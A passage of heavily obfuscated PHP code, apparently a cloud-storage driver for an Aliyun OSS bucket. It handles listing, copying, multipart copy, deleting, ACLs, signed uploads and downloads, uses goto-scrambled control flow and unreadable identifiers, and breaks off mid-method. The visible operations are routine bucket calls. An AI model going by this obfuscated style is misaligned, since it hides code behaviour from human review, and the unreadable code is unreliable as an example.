EÌİÀ™´åÔ: $cç¬„„Ï…‡ =& $_SERVER[¨¤¼…´]; $dĞ‰„Ÿ˜Ç = trim($dĞ‰„Ÿ˜Ç, $cç¬„„Ï…‡[8]); $E‡¹·òá¯ = empty($dĞ‰„Ÿ˜Ç) ? $cç¬„„Ï…‡[43] : $dĞ‰„Ÿ˜Ç . $cç¬„„Ï…‡[8]; goto dŒ·÷Ç¢Şˆ; dŒ·÷Ç¢Şˆ: $B”àšŠˆï = $cç¬„„Ï…‡[43]; $d ëÛ÷ğ²¶ = 1000; $a¬™ÂÎ™Ê = $C…’Û’“ = array(); goto E“´ßÏÖî; E“´ßÏÖî: while (!0) { $e¤è‡¨Š†² = array($cç¬„„Ï…‡[1171] => $fŒùÑ¡ò, $cç¬„„Ï…‡[200] => $E‡¹·òá¯, $cç¬„„Ï…‡[1172] => $d ëÛ÷ğ²¶, $cç¬„„Ï…‡[1173] => $B”àšŠˆï); try { $eîÙŞ‹Œ‘İ = $this->client->listObjects($this->bucket, $e¤è‡¨Š†²); } catch (OSS\Core\OssException $b¢”ÓÚ‡ÃÒ) { break; } $B”àšŠˆï = $eîÙŞ‹Œ‘İ->getNextMarker(); $B¬çÔ§ = $eîÙŞ‹Œ‘İ->getObjectList(); $Aã©Ü­¦¨â = $eîÙŞ‹Œ‘İ->getPrefixList(); foreach ($B¬çÔ§ as $f•´«—©ù¹) { if ($f•´«—©ù¹->getKey() == $E‡¹·òá¯) { continue; } $B–÷¡¼Õ¢‚ = $f•´«—©ù¹->getKey(); if ($E”ç«ŠŸ‡) { $B–÷¡¼Õ¢‚ = array($cç¬„„Ï…‡[38] => $B–÷¡¼Õ¢‚, $cç¬„„Ï…‡[87] => $f•´«—©ù¹->getSize(), $cç¬„„Ï…‡[204] => strtotime($f•´«—©ù¹->getLastModified())); } $C…’Û’“[] = $B–÷¡¼Õ¢‚; } foreach ($Aã©Ü­¦¨â as $d½‹Ù‰çÈè) { $a¬™ÂÎ™Ê[] = $d½‹Ù‰çÈè->getPrefix(); } if ($B”àšŠˆï === $cç¬„„Ï…‡[43]) { break; } } return array($cç¬„„Ï…‡[84] => $a¬™ÂÎ™Ê, $cç¬„„Ï…‡[83] => $C…’Û’“); goto FŞæ¿Š°Ú; FŞæ¿Š°Ú: } public function copyFile($a½º×ë‚Ã, $bÓ×ù·²Í) { $C×“¡…’¶ = $this->size($a½º×ë‚Ã); if ($C×“¡…’¶ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $a½º×ë‚Ã, $this->bucket, $this->pathEncode($bÓ×ù·²Í)); } catch (OSS\Core\OssException $BòŸÅ©óÎ) { return !1; } return $this->getPathOuter($bÓ×ù·²Í); } $AÊ–ù¦¬ÏŸ = $this->multiCopyObject($a½º×ë‚Ã, $bÓ×ù·²Í, $C×“¡…’¶); return $AÊ–ù¦¬ÏŸ ? $this->getPathOuter($bÓ×ù·²Í) : !1; } private function multiCopyObject($aŞññÔË”é, $cÏŒËàí‰×, $eÇ‚Ï³±) { $E™·ƒÈã¡ =& $_SERVER[¨¤¼…´]; try { goto EŸ°œÑÁº; D‘İ²Ã‹Çß: $aØóà¶ °„ = array(); foreach ($CçŒ“²Ó¯³ as $D‘Èáİã® => $EĞŠ² Ñ§È) { $aØóà¶ °„[] = array($E™·ƒÈã¡[1178] => $D‘Èáİã® + 1, $E™·ƒÈã¡[1179] => $EĞŠ² Ñ§È); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($cÏŒËàí‰×), $c–Òì –÷‰, $aØóà¶ °„); goto eÍÎĞŞªî¿; DÜ³â˜ÉòŠ: $d‡¼ñ…áœ¤ = 1; $Eğ¹°º´‡ = 0; $CçŒ“²Ó¯³ = array(); goto FÍ†ƒ’•¥Ÿ; EŸ°œÑÁº: $b™İ…Ì™øÉ = array(); if ($A¥¬¹İ‘È = $this->hashMd5($aŞññÔË”é)) { $b™İ…Ì™øÉ = array(OSS\OssClient::OSS_HEADERS => array($E™·ƒÈã¡[1174] => $A¥¬¹İ‘È)); } $c–Òì –÷‰ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cÏŒËàí‰×), $b™İ…Ì™øÉ); goto DÜ³â˜ÉòŠ; FÍ†ƒ’•¥Ÿ: $eÊ£Ğ‰§Ò‡ = 1024 * 1024 * 10; $e¶Œƒ®ò¹ = $this->client->generateMultiuploadParts($eÇ‚Ï³±, $eÊ£Ğ‰§Ò‡); foreach ($e¶Œƒ®ò¹ as $D‘Èáİã® => $B©×èˆçÒ) { $cÀ´ÄŒˆ… = $Eğ¹°º´‡ + (int) $B©×èˆçÒ[$E™·ƒÈã¡[1175]]; $e´Ú Š•‡” = (int) $B©×èˆçÒ[$E™·ƒÈã¡[338]] + $cÀ´ÄŒˆ… - 1; $DÀµÏ¤Á§ = array($E™·ƒÈã¡[1176] => $cÀ´ÄŒˆ…, $E™·ƒÈã¡[1177] => $e´Ú Š•‡”); $CçŒ“²Ó¯³[] = $this->client->uploadPartCopy($this->bucket, $aŞññÔË”é, $this->bucket, $this->pathEncode($cÏŒËàí‰×), $d‡¼ñ…áœ¤, $c–Òì –÷‰, $DÀµÏ¤Á§); $d‡¼ñ…áœ¤ = $d‡¼ñ…áœ¤ + 1; } goto D‘İ²Ã‹Çß; eÍÎĞŞªî¿: } catch (OSS\Core\OssException $fªù‹´®ØŒ) { return !1; } return !0; } public function moveFile($BºøÃ•¬á—, $Fâõ×‡Æ—©) { if ($this->copyFile($BºøÃ•¬á—, $Fâõ×‡Æ—©)) { $this->remove($BºøÃ•¬á—); return $this->getPathOuter($Fâõ×‡Æ—©); } return !1; } public function delFile($fª«¾ˆ¥¹) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fª«¾ˆ¥¹)); } catch (OSS\Core\OssException $CÔ„Ô¶‹´é) { return !1; } return !0; } public function delFolder($a·Àê–çÄ¡) { $cÄàÍæÁ¨Ù =& $_SERVER[¨¤¼…´]; $DŠâ²¿Ÿ’ä = $this->fileList($a·Àê–çÄ¡); if (!empty($a·Àê–çÄ¡) && !in_array(trim($a·Àê–çÄ¡, $cÄàÍæÁ¨Ù[8]) . $cÄàÍæÁ¨Ù[8], $DŠâ²¿Ÿ’ä[$cÄàÍæÁ¨Ù[83]])) { $DŠâ²¿Ÿ’ä[$cÄàÍæÁ¨Ù[83]][] = trim($a·Àê–çÄ¡, $cÄàÍæÁ¨Ù[8]) . $cÄàÍæÁ¨Ù[8]; } foreach (array_chunk($DŠâ²¿Ÿ’ä[$cÄàÍæÁ¨Ù[83]], 1000) as $AŞ¿¶«Æ…³) { try { $this->client->deleteObjects($this->bucket, $AŞ¿¶«Æ…³); } catch (OSS\Core\OssException $e¦±•Ûğ Š) { continue; } } return !0; } public function rename($fŒ‹‘Ù‚ÇÓ, $E‡÷ˆÃÕö•) { return $this->renameObject($fŒ‹‘Ù‚ÇÓ, $E‡÷ˆÃÕö•); } private function fileInfo($C´®¾ğæˆË, $B¹ùŠÚ–Óø = array()) { goto c—áÛ¢²Ã; fàò¿®‡–: if (isset($B¹ùŠÚ–Óø[$cÇìŒË†øê[87]])) { $FöÉì‰[$cÇìŒË†øê[87]] = $B¹ùŠÚ–Óø[$cÇìŒË†øê[87]]; } if (isset($B¹ùŠÚ–Óø[$cÇìŒË†øê[117]])) { $FöÉì‰[$cÇìŒË†øê[117]] = $B¹ùŠÚ–Óø[$cÇìŒË†øê[117]]; } if (isset($B¹ùŠÚ–Óø[$cÇìŒË†øê[204]]) && !trim($FöÉì‰[$cÇìŒË†øê[117]])) { $FöÉì‰[$cÇìŒË†øê[117]] = $B¹ùŠÚ–Óø[$cÇìŒË†øê[204]]; } goto DÍÖ…•å÷•; c—áÛ¢²Ã: $cÇìŒË†øê =& $_SERVER[¨¤¼…´]; $FöÉì‰ = array($cÇìŒË†øê[38] => $this->pathThis($C´®¾ğæˆË), $cÇìŒË†øê[85] => $this->getPathOuter($C´®¾ğæˆË), $cÇìŒË†øê[39] => $cÇìŒË†øê[181], $cÇìŒË†øê[201] => 0, $cÇìŒË†øê[117] => 0, $cÇìŒË†øê[87] => 0, $cÇìŒË†øê[175] => $this->ext($C´®¾ğæˆË), $cÇìŒË†øê[202] => !0, $cÇìŒË†øê[203] => !0); if (empty($B¹ùŠÚ–Óø)) { $EŠ—³À©·… = $this->objectMeta($C´®¾ğæˆË); if (!$EŠ—³À©·…) { return $FöÉì‰; } $B¹ùŠÚ–Óø = array($cÇìŒË†øê[117] => strtotime($EŠ—³À©·…[$cÇìŒË†øê[1180]]), $cÇìŒË†øê[87] => $EŠ—³À©·…[$cÇìŒË†øê[1181]] + 0); } goto fàò¿®‡–; DÍÖ…•å÷•: return $FöÉì‰; goto Eƒö±•¯¹¿; Eƒö±•¯¹¿: } private function folderInfo($A“·¶×£ƒ¿, $dŒÅ­Šï‚Ï = array()) { $d­áë—äŒİ =& $_SERVER[¨¤¼…´]; $d¨±³ŸÒ£å = array($d­áë—äŒİ[38] => $this->pathThis($A“·¶×£ƒ¿), $d­áë—äŒİ[85] => $this->getPathOuter($d­áë—äŒİ[8] . $A“·¶×£ƒ¿), $d­áë—äŒİ[39] => $d­áë—äŒİ[86], $d­áë—äŒİ[201] => 0, $d­áë—äŒİ[117] => 0, $d­áë—äŒİ[202] => !0, $d­áë—äŒİ[203] => !0); if (empty($dŒÅ­Šï‚Ï)) { $A“·¶×£ƒ¿ = rtrim($A“·¶×£ƒ¿, $d­áë—äŒİ[8]) . $d­áë—äŒİ[8]; $bª‡¶®ñáÑ = $this->objectMeta($A“·¶×£ƒ¿); if (!$bª‡¶®ñáÑ) { return $d¨±³ŸÒ£å; } $dŒÅ­Šï‚Ï = array($d­áë—äŒİ[201] => $bª‡¶®ñáÑ[$d­áë—äŒİ[1182]][$d­áë—äŒİ[1183]], $d­áë—äŒİ[117] => strtotime($bª‡¶®ñáÑ[$d­áë—äŒİ[1180]])); } if (isset($dŒÅ­Šï‚Ï[$d­áë—äŒİ[117]])) { $d¨±³ŸÒ£å[$d­áë—äŒİ[117]] = $dŒÅ­Šï‚Ï[$d­áë—äŒİ[117]]; } if (isset($dŒÅ­Šï‚Ï[$d­áë—äŒİ[201]])) { $d¨±³ŸÒ£å[$d­áë—äŒİ[201]] = $dŒÅ­Šï‚Ï[$d­áë—äŒİ[201]]; } return $d¨±³ŸÒ£å; } public function listPath($f—´«Ş×„, $E½Ú§²’ºŸ = false) { $eßÀ™ñ =& $_SERVER[¨¤¼…´]; $b™·»°¯á¬ = $this->fileList($f—´«Ş×„, $eßÀ™ñ[8], !0); foreach ($b™·»°¯á¬[$eßÀ™ñ[84]] as $aÕÓë¯´Ãò => $A¹°ÎÑŠ†) { $b™·»°¯á¬[$eßÀ™ñ[84]][$aÕÓë¯´Ãò] = $this->folderInfo($A¹°ÎÑŠ†, $A¹°ÎÑŠ†); } foreach ($b™·»°¯á¬[$eßÀ™ñ[83]] as $aÕÓë¯´Ãò => $A¹°ÎÑŠ†) { $b™·»°¯á¬[$eßÀ™ñ[83]][$aÕÓë¯´Ãò] = $this->fileInfo($A¹°ÎÑŠ†[$eßÀ™ñ[38]], $A¹°ÎÑŠ†); } return $b™·»°¯á¬; } public function has($dõ¼ø¡† , $d‡›Ğ‡ø = false, $D¶ô¥¤İ†È = true) { goto eæíÍÑ×¶; FÂ‚íƒ»¥§: return !1; goto eöÏàá¾†; D“‘ğŞ¶Ï’: $cÕ—ØÀƒÜ = 0; while (!0) { $d¸Ñ‚Àëù = array($E˜Ò½¯Ò¹[1171] => $E˜Ò½¯Ò¹[8], $E˜Ò½¯Ò¹[200] => $a•éÀÔ²àš, $E˜Ò½¯Ò¹[1172] => $f†‚ÅæÖ¬¦, $E˜Ò½¯Ò¹[1173] => $d§òĞó¸‰); try { $cˆ°ïéœ²° = $this->client->listObjects($this->bucket, $d¸Ñ‚Àëù); } catch (OSS\Core\OssException $Bœç§äª™Í) { break; } $d§òĞó¸‰ = $cˆ°ïéœ²°->getNextMarker(); $DÈåÓÀï·Ü = $cˆ°ïéœ²°->getObjectList(); $FÛ¶š®Õ’¹ = $cˆ°ïéœ²°->getPrefixList(); if ($d‡›Ğ‡ø) { if (count($DÈåÓÀï·Ü) > 1 || count($DÈåÓÀï·Ü) == 1 && $DÈåÓÀï·Ü[0]->getKey() != $a•éÀÔ²àš) { $e×ç¬è«Úé += count($DÈåÓÀï·Ü) - 1; } if (!empty($FÛ¶š®Õ’¹)) { $cÕ—ØÀƒÜ += count($FÛ¶š®Õ’¹); } if ($d§òĞó¸‰ === $E˜Ò½¯Ò¹[43]) { break; } continue; } if ($D¶ô¥¤İ†È) { if (!empty($DÈåÓÀï·Ü)) { if (count($DÈåÓÀï·Ü) > 1 || $DÈåÓÀï·Ü[0]->getKey() != $a•éÀÔ²àš) { return !0; } } } else { if (!empty($FÛ¶š®Õ’¹)) { return !0; } } if ($d§òĞó¸‰ === $E˜Ò½¯Ò¹[43]) { break; } } if ($d‡›Ğ‡ø) { return array($E˜Ò½¯Ò¹[205] => $e×ç¬è«Úé, $E˜Ò½¯Ò¹[206] => $cÕ—ØÀƒÜ); } goto FÂ‚íƒ»¥§; eæíÍÑ×¶: $E˜Ò½¯Ò¹ =& $_SERVER[¨¤¼…´]; $dõ¼ø¡†  = trim($dõ¼ø¡† , $E˜Ò½¯Ò¹[8]); $a•éÀÔ²àš = empty($dõ¼ø¡† ) ? $E˜Ò½¯Ò¹[43] : $dõ¼ø¡†  . $E˜Ò½¯Ò¹[8]; goto c°Ìˆ©‹ò±; c°Ìˆ©‹ò±: $d§òĞó¸‰ = $E˜Ò½¯Ò¹[43]; $f†‚ÅæÖ¬¦ = 500; $e×ç¬è«Úé = 0; goto D“‘ğŞ¶Ï’; eöÏàá¾†: } public function listAll($d’™ÑÂåÁ„) { $fÏ†ç›óÁÉ =& $_SERVER[¨¤¼…´]; $bó¥Û„õ ¢ = $this->fileList($d’™ÑÂåÁ„, $fÏ†ç›óÁÉ[43], !0); $Aõ¼ôÉ•šæ = array(); foreach ($bó¥Û„õ ¢[$fÏ†ç›óÁÉ[83]] as $BŞ¯Âï÷) { $Aõ¼ôÉ•šæ[$BŞ¯Âï÷[$fÏ†ç›óÁÉ[38]]] = $BŞ¯Âï÷[$fÏ†ç›óÁÉ[87]]; } return $this->listAllFiles($d’™ÑÂåÁ„, array_keys($Aõ¼ôÉ•šæ), $Aõ¼ôÉ•šæ); } public function canRead($d«âä¼ô«Ê) { $CÁÈÌÙÌğ… =& $_SERVER[¨¤¼…´]; $eôŒá¾Ñ¾› = $this->pathAcl($d«âä¼ô«Ê); return $eôŒá¾Ñ¾› == $CÁÈÌÙÌğ…[1184] || $eôŒá¾Ñ¾› == $CÁÈÌÙÌğ…[504] ? !0 : !1; } public function canWrite($f¡êêÀÚïÁ) { $DĞÊ…ïÀù = $this->pathAcl($f¡êêÀÚïÁ); return $DĞÊ…ïÀù == $_SERVER[¨¤¼…´][504] ? !0 : !1; } public function pathAcl($b®ğããŒ¿Á) { goto Bª‘î¸ˆ²ñ; Bª‘î¸ˆ²ñ: $e«½— …ª =& $_SERVER[¨¤¼…´]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $EŠÆÎŠõ‘õ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($b®ğããŒ¿Á)); } catch (OSS\Core\OssException $Eõ®¤â©) { return !1; } goto DÒÑŞ¾Ñ¯; eÜ™¢Çöæ : return $Fßèé¬ÑíÊ; goto eŠ¢·±×«£; DÒÑŞ¾Ñ¯: $Fßèé¬ÑíÊ = $EŠÆÎŠõ‘õ == $e«½— …ª[44] ? $this->bucketAcl : $EŠÆÎŠõ‘õ; if ($Fßèé¬ÑíÊ == $e«½— …ª[1185]) { return $e«½— …ª[1184]; } if ($Fßèé¬ÑíÊ == $e«½— …ª[1186]) { return $e«½— …ª[504]; } goto eÜ™¢Çöæ ; eŠ¢·±×«£: } private function chmodPath($Fø¨ê†¤íß, $E‡•’½¾¶¤ = '') { $FßÊ¡Ü’š® =& $_SERVER[¨¤¼…´]; $DíÚéƒõÜ“ = empty($E‡•’½¾¶¤) ? $FßÊ¡Ü’š®[1186] : $E‡•’½¾¶¤; $bÖ¡ÇŒ—ğ¡ = array($FßÊ¡Ü’š®[44], $FßÊ¡Ü’š®[199], $FßÊ¡Ü’š®[1185], $FßÊ¡Ü’š®[1186]); if (!in_array($DíÚéƒõÜ“, $bÖ¡ÇŒ—ğ¡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Fø¨ê†¤íß), $DíÚéƒõÜ“); } catch (OSS\Core\OssException $FÔ²µµ³Ãº) { return !1; } return !0; } public function getContent($AîªìĞ‹¡¼) { return $this->fileSubstr($AîªìĞ‹¡¼, -1); } public function setContent($c¡êÂ©ÅÙ, $FÒÑà±‘ = '') { $f©‘Âïá»Š =& $_SERVER[¨¤¼…´]; try { $dò¼Û¿õê = $this->trafficLimit($f©‘Âïá»Š[1187]); $AªÜÙ¾µºŞ = $this->client->putObject($this->bucket, $this->pathEncode($c¡êÂ©ÅÙ), $FÒÑà±‘, $dò¼Û¿õê); } catch (OSS\Core\OssException $eÙÒß–ÆİÛ) { return !1; } $BÃã­ÓË…í = array($f©‘Âïá»Š[1174] => trim($AªÜÙ¾µºŞ[$f©‘Âïá»Š[1188]], $f©‘Âïá»Š[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($c¡êÂ©ÅÙ))); $this->updateObjMeta($c¡êÂ©ÅÙ, $BÃã­ÓË…í); return isset($AªÜÙ¾µºŞ[$f©‘Âïá»Š[1189]][$f©‘Âïá»Š[1136]]) ? (int) $AªÜÙ¾µºŞ[$f©‘Âïá»Š[1189]][$f©‘Âïá»Š[1136]] : strlen($AªÜÙ¾µºŞ); } private function updateObjMeta($BÔÇøŒ¯Î, $DÊÎŠ˜óá) { $BÔÇøŒ¯Î = $this->pathEncode($BÔÇøŒ¯Î); try { $eñØ…Â†¸ì = array(OSS\OssClient::OSS_HEADERS => $DÊÎŠ˜óá); $this->client->copyObject($this->bucket, $BÔÇøŒ¯Î, $this->bucket, $BÔÇøŒ¯Î, $eñØ…Â†¸ì); } catch (OSS\Core\OssException $eÊªî¾Å¬) { return !1; } return !0; } public function upload($CáµÎÃ„, $eÇ·ì¦³·, $Dì‹”‚Şƒš = false, $B¥ùÑ£¹Ùª = REPEAT_REPLACE) { $f»¬èÂ¢»´ =& $_SERVER[¨¤¼…´]; $dòİ§¾ïßÈ = trim($CáµÎÃ„, $f»¬èÂ¢»´[8]); $CàÌéİÈöğ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($f»¬èÂ¢»´[1174] => @md5_file($eÇ·ì¦³·)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CáµÎÃ„))); $CàÌéİÈöğ = $this->trafficLimit($f»¬èÂ¢»´[1187], $CàÌéİÈöğ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($dòİ§¾ïßÈ), $eÇ·ì¦³·, $CàÌéİÈöğ); } catch (OSS\Core\OssException $cóÛ‚ñÊÏÀ) { return !1; } return $this->getPathOuter($CáµÎÃ„); } public function getHost() { $E»‡œİ¯ =& $_SERVER[¨¤¼…´]; $féÊÈİŸÔÖ = explode($E»‡œİ¯[185], parent::getHost()); return $féÊÈİŸÔÖ[0] . $E»‡œİ¯[185] . $this->bucket . $E»‡œİ¯[101] . $féÊÈİŸÔÖ[1]; } public function uploadFormData($Cöºö«ŠãÓ, $E¨õ›ñ¤å = 3600) { goto cøŸœÑºŒï; cøŸœÑºŒï: $f¨ÜÍÉÎß =& $_SERVER[¨¤¼…´]; if (!($eÉšÆæ¶Æ“ = $this->getHost())) { return !1; } $Aã÷“‰ÔŠœ = $E¨õ›ñ¤å; goto dÏäå„ãğ; B¿„Š£÷©í: $b»æ²±¦… = base64_encode(hash_hmac($f¨ÜÍÉÎß[231], $Bø¥¿êŠ‡ï, $this->secret, !0)); $e“ª˜ÓÛÛ = array($f¨ÜÍÉÎß[1102] => $Bø¥¿êŠ‡ï, $f¨ÜÍÉÎß[1193] => $this->accessKey, $f¨ÜÍÉÎß[1098] => $f¨ÜÍÉÎß[1090], $f¨ÜÍÉÎß[1194] => $b»æ²±¦…, $f¨ÜÍÉÎß[183] => $eÉšÆæ¶Æ“); $e“ª˜ÓÛÛ = $this->trafficLimit($f¨ÜÍÉÎß[1187], $e“ª˜ÓÛÛ); goto bè¨–áâåÆ; D÷î ùàí: $d‡‘Ôİ¸ì = $this->pathFather($Cöºö«ŠãÓ); $eÆİ…ëÀÄ¯ = array($f¨ÜÍÉÎß[1092] => $B¿è›ğõ¨´, $f¨ÜÍÉÎß[1093] => array(array($f¨ÜÍÉÎß[1192], 0, $bñœÕ†ó), array($f¨ÜÍÉÎß[1096], $f¨ÜÍÉÎß[1097], $d‡‘Ôİ¸ì))); $Bø¥¿êŠ‡ï = base64_encode(json_encode($eÆİ…ëÀÄ¯)); goto B¿„Š£÷©í; dÏäå„ãğ: $Fœ‘µˆ§…Ó = date($f¨ÜÍÉÎß[1190], time() + $Aã÷“‰ÔŠœ); $E¿¼ìå…“ø = new DateTime($Fœ‘µˆ§…Ó); $B¿è›ğõ¨´ = $E¿¼ìå…“ø->format(DateTime::ISO8601); goto a«°ôãœÒ„; bè¨–áâåÆ: return $e“ª˜ÓÛÛ; goto e¬Ñ¾Ú•; a«°ôãœÒ„: $Aá¾Â¸‹ = strpos($B¿è›ğõ¨´, $f¨ÜÍÉÎß[297]); $B¿è›ğõ¨´ = substr($B¿è›ğõ¨´, 0, $Aá¾Â¸‹) . $f¨ÜÍÉÎß[1191]; $bñœÕ†ó = 1048576000 * 5; goto D÷î ùàí; e¬Ñ¾Ú•: } public function multiUploadFormData($fŒ®’òŒâ, $b„ŒÌ†¼Å = 3600) { $E×è¢ÍŸ¶‰ =& $_SERVER[¨¤¼…´]; if (!($dõÂƒ„ö‡­ = $this->getHost())) { return !1; } $CîŒƒÇ×’ = $this->trafficLimit($E×è¢ÍŸ¶‰[1187]); $B„°¨“ïÅ÷ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fŒ®’òŒâ), $CîŒƒÇ×’); return array($E×è¢ÍŸ¶‰[223] => $B„°¨“ïÅ÷, $E×è¢ÍŸ¶‰[183] => $dõÂƒ„ö‡­ . $E×è¢ÍŸ¶‰[8] . $this->pathEncode($fŒ®’òŒâ), $E×è¢ÍŸ¶‰[224] => gmdate($E×è¢ÍŸ¶‰[1195]), $E×è¢ÍŸ¶‰[99] => $fŒ®’òŒâ); } public function multiUploadAuthData($B¤ÛíÌÅˆ‡, $cÔ‰ğëš‡„ = array()) { goto Fù±Åöéã; AÁÒä”¸: $f°ã’ô = array($BùóáåÍŒ™[226], $BùóáåÍŒ™[43], $BùóáåÍŒ™[126], $aêÃ¾óÆÊ, "\170\x2d\157\x73\163\x2d\x64\x61\x74\x65\x3a{$aêÃ¾óÆÊ}", $BùóáåÍŒ™[8] . $this->bucket . $BùóáåÍŒ™[8] . $d ÚÛë–¤› . $D²‘†ó Ã); if (strpos($D²‘†ó Ã, $BùóáåÍŒ™[227]) === 0) { $f°ã’ô[0] = $BùóáåÍŒ™[228]; if ($A†Ÿï“Š–½ = $this->trafficLimit($BùóáåÍŒ™[1187])) { $d ÚÛë–¤› = $BùóáåÍŒ™[1196]; array_splice($f°ã’ô, 5, 0, $d ÚÛë–¤› . $BùóáåÍŒ™[4] . $A†Ÿï“Š–½[$d ÚÛë–¤›]); } } if (isset($cÔ‰ğëš‡„[$BùóáåÍŒ™[229]]) && $cÔ‰ğëš‡„[$BùóáåÍŒ™[229]] == $BùóáåÍŒ™[230]) { $f°ã’ô[0] = $BùóáåÍŒ™[230]; } goto C§ãá‰‡ëË; b¯”ƒ×£Âˆ: $d ÚÛë–¤› = $B¤ÛíÌÅˆ‡; if (isset($cÔ‰ğëš‡„[$BùóáåÍŒ™[99]])) { $d ÚÛë–¤› = $cÔ‰ğëš‡„[$BùóáåÍŒ™[99]]; unset($cÔ‰ğëš‡„[$BùóáåÍŒ™[99]]); } if (isset($cÔ‰ğëš‡„[$BùóáåÍŒ™[225]])) { $cÔ‰ğëš‡„[$BùóáåÍŒ™[224]] = $aêÃ¾óÆÊ; return $this->listUploadParts($d ÚÛë–¤›, $cÔ‰ğëš‡„); } goto AÁÒä”¸; BÎöËÃ††: $D³Ş®¢¯ƒ‚ = $BùóáåÍŒ™[1161] . $this->accessKey . $BùóáåÍŒ™[4] . $B³ ¼İÏ‹ï; if (strpos($D²‘†ó Ã, $BùóáåÍŒ™[227]) === 0) { $D³Ş®¢¯ƒ‚ = array($BùóáåÍŒ™[233] => $D³Ş®¢¯ƒ‚, $BùóáåÍŒ™[224] => $aêÃ¾óÆÊ); if ($A†Ÿï“Š–½) { $D³Ş®¢¯ƒ‚ = array_merge($D³Ş®¢¯ƒ‚, $A†Ÿï“Š–½); } } return $D³Ş®¢¯ƒ‚; goto E©½Š±ïñ˜; C§ãá‰‡ëË: if (!empty($cÔ‰ğëš‡„[$BùóáåÍŒ™[1197]])) { $c¤÷‹«©¶§ = array_merge(array($f°ã’ô[4]), $cÔ‰ğëš‡„[$BùóáåÍŒ™[1197]]); sort($c¤÷‹«©¶§); $f°ã’ô[4] = implode($BùóáåÍŒ™[14], $c¤÷‹«©¶§); } $DïØŞğ˜Õ = implode($BùóáåÍŒ™[14], $f°ã’ô); $B³ ¼İÏ‹ï = base64_encode(hash_hmac($BùóáåÍŒ™[231], $DïØŞğ˜Õ, $this->secret, !0)); goto BÎöËÃ††; Fù±Åöéã: $BùóáåÍŒ™ =& $_SERVER[¨¤¼…´]; $aêÃ¾óÆÊ = isset($cÔ‰ğëš‡„[$BùóáåÍŒ™[224]]) ? $cÔ‰ğëš‡„[$BùóáåÍŒ™[224]] : gmdate($BùóáåÍŒ™[1195]); $D²‘†ó Ã = isset($cÔ‰ğëš‡„[$BùóáåÍŒ™[175]]) ? $cÔ‰ğëš‡„[$BùóáåÍŒ™[175]] : $BùóáåÍŒ™[43]; goto b¯”ƒ×£Âˆ; E©½Š±ïñ˜: } public function listUploadParts($Aò‹˜ê‚ã, $f‹•ë¡¦øë) { goto A³Ö’ìã³¥; A³Ö’ìã³¥: $d’éõ ¿¹† =& $_SERVER[¨¤¼…´]; $a“Ô·øÂİÙ = parse_url_query($f‹•ë¡¦øë[$d’éõ ¿¹†[175]]); $E¤ŠÙ†äÀ = $this->client->listParts($this->bucket, $this->pathEncode($Aò‹˜ê‚ã), $a“Ô·øÂİÙ[$d’éõ ¿¹†[223]]); goto b¯ßâ—Î¾Â; d®†çˆ¼ô: return array($d’éõ ¿¹†[233] => $Cå²Í‰Òù, $d’éõ ¿¹†[224] => $f‹•ë¡¦øë[$d’éõ ¿¹†[224]], $d’éõ ¿¹†[235] => $Dµ«´³¯µ); goto FöÆ’öØ³â; b¯ßâ—Î¾Â: $f³©¤¢ÌÒ• = $E¤ŠÙ†äÀ->getListPart(); $Dµ«´³¯µ = array(); foreach ($f³©¤¢ÌÒ• as $Bµ»İ¹¬«š) { $Dµ«´³¯µ[] = array($d’éõ ¿¹†[1178] => $Bµ»İ¹¬«š->getPartNumber(), $d’éõ ¿¹†[1179] => trim($Bµ»İ¹¬«š->getETag(), $d’éõ ¿¹†[123])); } goto BÑö’ëì; BÑö’ëì: unset($f‹•ë¡¦øë[$d’éõ ¿¹†[225]], $f‹•ë¡¦øë[$d’éõ ¿¹†[229]]); $Cå²Í‰Òù = $this->multiUploadAuthData($Aò‹˜ê‚ã, $f‹•ë¡¦øë); if (empty($Cå²Í‰Òù)) { return !1; } goto d®†çˆ¼ô; FöÆ’öØ³â: } public function download($fŒæÍˆÍô, $C§—Ô„À„à) { if ($this->isFolder($fŒæÍˆÍô)) { return !1; } try { $C—èÖ“• = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $C§—Ô„À„à); $C—èÖ“• = $this->trafficLimit($_SERVER[¨¤¼…´][115], $C—èÖ“•); $this->client->getObject($this->bucket, $this->pathEncode($fŒæÍˆÍô), $C—èÖ“•); } catch (OSS\Core\OssException $Fë’±æÃ¥) { return !1; } return $C§—Ô„À„à; } public function fileSubstr($AŸ­¶Œ‹ä, $eÏÜ‘¾¼Ó² = 0, $aÀƒõ‘Ù„ = false) { if ($eÏÜ‘¾¼Ó² === -1) { $DÍ™è×´©ß = array(); } else { if ($aÀƒõ‘Ù„ === !1) { $E†öÔÅ¼ÔÓ = $this->size($AŸ­¶Œ‹ä); } else { $E†öÔÅ¼ÔÓ = $eÏÜ‘¾¼Ó² + $aÀƒõ‘Ù„ - 1; } $DÍ™è×´©ß = array(OSS\OssClient::OSS_RANGE => "{$eÏÜ‘¾¼Ó²}\x2d{$E†öÔÅ¼ÔÓ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($AŸ­¶Œ‹ä), $DÍ™è×´©ß); } catch (OSS\Core\OssException $EÃÜÊŒ…ê) { think_exception($EÃÜÊŒ…ê->getMessage()); return !1; } } private function trafficLimit($F¨ãÃ¤åê, $FØÕê’åŠ½ = array()) { goto d…ïºßµ˜å; EÒ±Ûâ—°ã: if (!$E†òŒˆˆ‰) { return $FØÕê’åŠ½; } $E†òŒˆˆ‰ = $E†òŒˆˆ‰ < 819200 ? 819200 : ($E†òŒˆˆ‰ > 838860800 ? 838860800 : $E†òŒˆˆ‰); $FØÕê’åŠ½[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E†òŒˆˆ‰); goto a«£Á›ÒÀÅ; a«£Á›ÒÀÅ: 